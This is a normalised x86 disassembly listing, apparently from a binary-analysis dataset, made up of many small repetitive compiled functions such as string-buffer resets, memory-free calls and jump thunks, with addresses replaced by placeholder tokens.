xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2ec0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2ef0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2f20
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2f50
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2f80
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2fb0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c2fe0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3010
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3040
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3070
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c30a0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c30d0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3100
mov ecx rw-data
jmp sub_460310
sub_4c3110
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3150
push sub_462cf0
push 0x8
push 0x10
push rw-data
call sub_4b6814
retn
sub_4c3170
push sub_462cf0
push 0x8
push 0x10
push rw-data
call sub_4b6814
retn
sub_4c3190
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c31d0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3210
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3250
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3290
mov ecx rw-data
jmp sub_4023c0
sub_4c32a0
mov ecx rw-data
jmp sub_4023c0
sub_4c32b0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c32f0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3330
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3370
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c33b0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c33f0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3430
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3470
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c34b0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c34f0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3530
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3570
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c35b0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3640
mov ecx rw-data
jmp sub_403b20
sub_4c3650
mov ecx rw-data
jmp sub_403b20
sub_4c3750
mov ecx rw-data
jmp sub_46aa20
sub_4c37b0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c37e0
mov ecx rw-data
jmp sub_460310
sub_4c37f0
mov ecx rw-data
jmp sub_403b20
sub_4c3800
mov ecx rw-data
jmp sub_4023c0
sub_4c3810
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c3850
mov ecx rw-data
jmp sub_4023c0
sub_4c3860
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4c38a0
mov ecx rw-data
jmp sub_448e30
sub_4c38b0
mov ecx rw-data
jmp sub_4b57e7
